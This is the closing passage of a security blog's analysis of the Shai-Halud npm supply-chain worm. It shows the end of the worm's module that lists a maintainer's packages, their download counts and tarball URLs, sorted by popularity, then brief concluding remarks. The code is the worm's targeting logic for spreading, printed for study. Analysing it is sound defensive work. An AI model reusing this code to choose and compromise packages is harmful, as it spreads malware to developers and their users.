</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">packageName</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">package</span><span class="err">?</span><span class="o">.</span><span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">version</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">package</span><span class="err">?</span><span class="o">.</span><span class="n">version</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">monthlyDownloads</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">downloads</span><span class="err">?</span><span class="o">.</span><span class="n">monthly</span> <span class="o">||</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">weeklyDownloads</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">downloads</span><span class="err">?</span><span class="o">.</span><span class="n">weekly</span> <span class="o">||</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">packageName</span> <span class="o">||</span> <span class="o">!</span><span class="n">version</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">packageDetail</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">getPackageDetail</span><span class="p">(</span><span class="n">packageName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="n">tarballUrl</span> <span class="o">=</span> <span class="n">packageDetail</span><span class="o">.</span><span class="n">versions</span><span class="err">?</span><span class="o">.</span><span class="p">[</span><span class="n">version</span><span class="p">]</span><span class="err">?</span><span class="o">.</span><span class="n">dist</span><span class="err">?</span><span class="o">.</span><span class="n">tarball</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="n">packages</span><span class="o">.</span><span class="n">push</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">name</span><span class="p">:</span> <span class="n">packageName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">version</span><span class="p">:</span> <span class="n">version</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">monthlyDownloads</span><span class="p">:</span> <span class="n">monthlyDownloads</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">weeklyDownloads</span><span class="p">:</span> <span class="n">weeklyDownloads</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">tarballUrl</span><span class="p">:</span> <span class="n">tarballUrl</span>
</span></span><span class="line"><span class="cl">          <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">console</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Error processing package:&#34;</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">packages</span><span class="o">.</span><span class="n">sort</span><span class="p">((</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="n">b</span><span class="o">.</span><span class="n">monthlyDownloads</span> <span class="o">-</span> <span class="n">a</span><span class="o">.</span><span class="n">monthlyDownloads</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">console</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="err">`</span><span class="n">Error</span> <span class="n">getting</span> <span class="n">packages</span> <span class="k">for</span> <span class="n">maintainer</span> <span class="o">$</span><span class="p">{</span><span class="n">maintainer</span><span class="p">}:</span><span class="err">`</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="n">NpmModule</span> <span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="concluding-thoughts">Concluding Thoughts</h3>
<p>This software supply chain attack is a perfect example of how powerful and effective this type of attack can be. Compromising packages that millions of people use allows it to spread to other packages, can be catastrophic. Keep your eyes open for the next chapter; the amount of credentials and secrets these attackers must have obtained is no joke.</p>
<p>Thank you for taking the time to read this analysis! If you have any questions, insights, or suggestions, feel free to reach out.</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2025-09-20</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://n0tr3alx.github.io/supply-chain-shai-halud/" data-title="NPM Supply Chain Attack: Shai-Halud Worm"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://n0tr3alx.github.io/supply-chain-shai-halud/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://n0tr3alx.github.io/supply-chain-shai-halud/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="https://n0tr3alx.github.io/supply-chain-shai-halud/" data-title="NPM Supply Chain Attack: Shai-Halud Worm" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://n0tr3alx.github.io/supply-chain-shai-halud/" data-title="NPM Supply Chain Attack: Shai-Halud Worm"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://n0tr3alx.github.io/supply-chain-shai-halud/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/malicious_extension/" class="prev" rel="prev" title="Malicious Browser Extension Analysis: MSI installer -&gt; malicious extension -&gt; C2 domain hidden in crypto transactions"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Malicious Browser Extension Analysis: MSI installer -> malicious extension -> C2 domain hidden in crypto transactions</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><h1 id="hack" style="font-size:16px;"></h1><script>let t="HACK THE PLANET",i=0,s=()=>{if(i<t.length){document.getElementById("hack").innerHTML+=t[i];i++;setTimeout(s,100);}};s();</script></div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
